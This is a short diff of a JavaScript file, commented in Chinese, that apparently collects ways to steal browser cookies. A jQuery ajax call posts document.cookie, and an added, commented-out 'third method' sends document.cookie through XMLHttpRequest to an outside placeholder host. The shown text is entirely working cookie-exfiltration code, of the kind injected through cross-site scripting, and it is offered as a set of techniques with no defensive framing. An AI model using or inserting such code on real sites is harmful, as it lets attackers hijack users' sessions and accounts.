@@ -23,3 +23,20 @@ $.ajax //第二种方法，通过JQ的ajax实现跨域请求
     data: "cookie=" + document.cookie,
 });	
 
+/*
+function loadXMLDoc() //第三种方法，通过原生的ajax请求，可能会被同源策略拦截
+{
+  var xmlhttp;
+  if (window.XMLHttpRequest)
+  {
+    xmlhttp=new XMLHttpRequest();
+  }
+  else
+  {
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+  xmlhttp.open("GET","http://www.examlpe.com",true); //异步请求
+  xmlhttp.send(document.cookie);
+}
+loadXMLDoc();
+*/
